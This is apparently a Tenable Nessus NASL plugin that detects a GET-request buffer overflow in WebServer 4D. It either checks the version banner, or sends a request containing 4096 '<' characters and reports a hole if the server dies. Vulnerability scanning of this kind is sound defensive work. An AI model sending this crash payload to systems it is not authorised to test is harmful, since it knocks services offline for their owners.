#
# (C) Tenable Network Security
#


if(description)
{
 script_id(11560);
 script_bugtraq_id(7479);
 script_version ("$Revision: 1.6 $");
 name["english"] = "WebServer 4D GET Buffer Overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to kill the web server by
sending an oversized string of '<' as an argument
to a GET request.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes 4D WS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencies("find_service.nes", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if(!banner)exit(0);
if ( "Web_Server_4D" >!< banner ) exit(0);

if( safe_checks() )
{
 if(egrep(pattern:"^Server: Web_Server_4D/([0-2]\..*|3\.([0-5]|6\.0))[^0-9]", string:banner))security_hole(port);
 exit(0);
}

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

req = http_get(item:"/" + crap(data:"<", length:4096), port:port);
send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_hole(port);
